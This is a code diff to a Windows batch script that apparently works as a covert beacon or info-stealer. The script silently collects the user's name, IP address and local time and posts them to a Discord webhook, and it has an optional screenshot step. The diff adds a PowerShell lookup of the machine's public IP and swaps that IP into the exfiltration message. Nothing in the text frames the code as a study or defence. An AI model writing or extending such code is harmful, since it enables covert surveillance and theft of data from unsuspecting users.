@@ -20,9 +20,13 @@ if not "%~dp0"=="%vpath%\" (
 :: --------------------------------------
 set "webhook=https://discord.com/api/webhooks/"
 
-:: GET IP ADDRESS
-:: --------------
+:: GET PRIVATE IP ADDRESS
+:: ----------------------
 for /f "delims=[] tokens=2" %%a in ('2^>NUL ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
+
+:: GET PUBLIC IP ADDRESS
+:: ---------------------
+for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
 
 :: GET TIME
 :: --------
@@ -33,7 +37,7 @@ for /f "tokens=1-4 delims=/:." %%a in ("%TIME%") do (
 
 :: SEND FIRST REPORT MESSAGE WITH SOME INFO
 :: ----------------------------------------
-curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[Report from %USERNAME% - %NetworkIP%]\nLocal time: %HH24%:%MI%```\"}"  %webhook%
+curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[Report from %USERNAME% - %PublicIP%]\nLocal time: %HH24%:%MI%```\"}"  %webhook%
 
 :: SCREENSHOT - REMOVE GOTO IF YOU WANT TO TAKE A SCREENSHOT WHEN RUN
 :: ------------------------------------------------------------------
